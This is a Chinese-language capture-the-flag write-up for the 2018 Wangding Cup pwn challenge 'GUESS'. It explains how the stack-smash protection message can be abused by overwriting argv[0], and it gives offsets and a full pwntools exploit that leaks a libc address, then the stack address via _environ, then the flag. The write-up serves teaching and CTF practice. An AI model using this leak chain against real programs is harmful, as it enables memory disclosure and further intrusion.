# 2018 网鼎杯 pwn--GUESS

![屏幕截图(97)](C:\Users\kOX\Pictures\Screenshots\屏幕截图(97).png)

放进ida查看一下，发现题目的要求是输入一段flag，要求与flag.txt文件里的内容相同，次数限制在3次。

![屏幕截图(96)](C:\Users\kOX\Pictures\Screenshots\屏幕截图(96).png)

checksec一下，明显的栈溢出漏洞，虽然开通了canary保护，但是flag已经读到栈里了。我们可以运用SSP(Stack Smashes Protect)

在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下


```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。



## 利用思路

利用栈溢出覆盖 argv[0] 为puts_got地址 --> leak libc --> leak stack --> leak flag

1. 泄漏libc的基址
2. 泄漏environ的地址（也就是栈的地址）
3. 泄漏flag

### 第一步 找到存储arg[0]的地址

![屏幕截图(99)](C:\Users\kOX\Pictures\Screenshots\屏幕截图(99).png)

用gdb来查看，在_strcmp函数那下断点，运行，我们输入一个‘a’。

![屏幕截图(98)](C:\Users\kOX\Pictures\Screenshots\屏幕截图(98).png)

可见 agrv[0]地址为0x7fffffffe388, 我们输入的地址为 0x7fffffffe260,距离是0x128,我们要覆盖的范围就是0x128

所以泄露的payload = ‘a' * 0x128 + 要泄露的地址

### 第二步 泄露出 puts 的真正地址，计算出 libc_base ，environ_addr 和 stack_base 

​	payload = 'a' * 0x128 + puts_got

得到 puts_addr 后，libc_addr = puts_addr - .symbols['puts']

​	environ_addr = libc_addr + .symbols['_environ']

利用libc_base和libc.symbol['environ']计算出environ在栈上的地址，然后在gdb中利用b *environ计算其栈地址和flag的栈地址之间的距离然后leak出flag

第二次泄漏_environ，也就是栈的地址，也是在argv[0]处覆盖为_environ
为什么泄漏_environ可以泄漏出栈的地址呢？
是因为：
在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments section）
用来存储系统环境变量的一份复制文件，进程在运行时可能需要。
例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。
该节是可写的，因此在格式串（format string）和缓冲区溢出（buffer overflow）攻击中都可以攻击该节。
*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。

环境表是一个表示环境字符串的字符指针数组，由name=value这样类似的字符串组成,它储存在整个进程空间的的顶部，栈地址之上
其中value是一个以”\0″结束的C语言类型的字符串，代表指针该环境变量的值
一般我们见到的name都是大写，但这只是一个惯例

![屏幕截图(101)](C:\Users\kOX\Pictures\Screenshots\屏幕截图(101).png)

可求出 stack_base与environ 地址差为 0x7fffffffe398 - 0x7fffffffe200 = 0x198

stack_base = environ_adr - 0x198

flag地址为 stack_base + 0x30

### 第三步 泄露出flag

payload = ’a' * 0x128 + p64(stack_base + 0x30)

exp：

```
from pwn import * 


p = process('./GUESS') 
elf = ELF('./GUESS')
libc = elf.libc

puts_got = elf.got['puts']
p.recvuntil('guessing flag') 
payload = 'a'*0x128 + p64(puts_got) 
p.sendline(payload) 
p.recvuntil('detected ***: ') 
puts_addr = u64(p.recv(6).ljust(8,'\x00')) 


offset_puts = libc.symbols['puts'] 
libc_base = puts_addr - offset_puts 

offset__environ = libc.symbols['_environ']
_environ_addr = libc_base + offset__environ 

p.recvuntil('guessing flag') 
payload = 'a'*0x128 + p64(_environ_addr) 
p.sendline(payload) 
p.recvuntil('detected ***: ') 
stack_base = u64(p.recv(6).ljust(8,'\x00')) - 0x198 

flag_addr = stack_base + 0x30 
p.recvuntil('guessing flag') 
payload = 'a'*0x128 + p64(flag_addr) 
p.sendline(payload) 
p.recvuntil('detected ***: ') 
flag = p.recvuntil('}') 
print flag 
p.interactive()



```

